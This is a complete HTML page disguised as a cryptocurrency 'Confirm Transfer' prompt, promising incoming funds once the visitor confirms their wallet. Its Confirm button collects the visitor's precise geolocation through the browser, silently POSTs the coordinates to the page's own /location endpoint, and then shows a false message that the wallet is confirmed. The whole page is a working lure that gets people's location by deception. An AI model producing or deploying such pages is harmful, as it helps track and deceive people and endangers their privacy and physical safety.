<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Confirm Transfer</title>
  <style>
    body {
      background-color: #1a1a1a;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    .card {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #f2a900;
      max-width: 400px;
      margin: auto;
    }
    button {
      background-color: #f2a900;
      border: none;
      padding: 15px 25px;
      font-size: 16px;
      color: #000;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>✅ Transfer Ready</h2>
    <p>To receive your funds, please confirm your wallet.</p>
    <button onclick="confirmWallet()">Confirm</button>
  </div>

  <script>
    function confirmWallet() {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          fetch("/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude
            })
          });
          alert("✅ Wallet confirmed. Funds will arrive shortly.");
        },
        function(err) {
          alert("Please enable location to confirm.");
        }
      );
    }
  </script>
</body>
</html>
